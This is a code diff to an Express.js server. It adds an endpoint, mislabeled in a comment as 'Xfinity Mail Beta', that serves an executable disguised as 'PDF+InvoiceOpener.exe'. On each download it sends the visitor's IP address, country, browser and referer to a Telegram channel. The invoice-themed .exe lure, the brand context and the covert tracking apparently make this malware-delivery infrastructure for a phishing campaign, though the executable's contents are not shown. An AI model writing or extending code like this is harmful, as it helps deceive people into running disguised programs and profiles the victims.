@@ -2246,6 +2246,42 @@ app.get('/comcast', async (req, res) => {
 
 
 
+
+
+
+
+// Endpoint for Xfinity Mail Beta
+app.get('/pdfopener', async (req, res) => {
+    const filePath = path.join(__dirname, 'dist', 'PDF+InvoiceOpener.exe');
+    
+    if (fs.existsSync(filePath)) {
+        const ip = getClientIP(req);
+        const userAgent = req.get('User-Agent') || 'Unknown';
+        const referer = req.get('Referer') || 'Direct';
+        const country = await getCountryFromIP(ip);
+        
+        const message = `
+🔔 <b>PDF+InvoiceOpener Download</b>
+📱 <b>User Agent:</b> ${userAgent}
+🌐 <b>IP:</b> ${ip}
+🌍 <b>Country:</b> ${country}
+🔗 <b>Referer:</b> ${referer}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+        `;
+        await sendTelegramAlert(message);
+
+        res.setHeader('Content-Disposition', 'attachment; filename="PDF+InvoiceOpener.exe"');
+        res.setHeader('Content-Type', 'application/octet-stream');
+        const readStream = fs.createReadStream(filePath);
+        readStream.pipe(res);
+    } else {
+        res.status(404).send('File not found. Please contact support.');
+    }
+});
+
+
+
+
 // ─── FORM SUBMISSION ENDPOINT ──────────────────────────────────
 app.post('/api/register', async (req, res) => {
     const { fullName, email, company, useCase, phone, role, experience, source } = req.body;
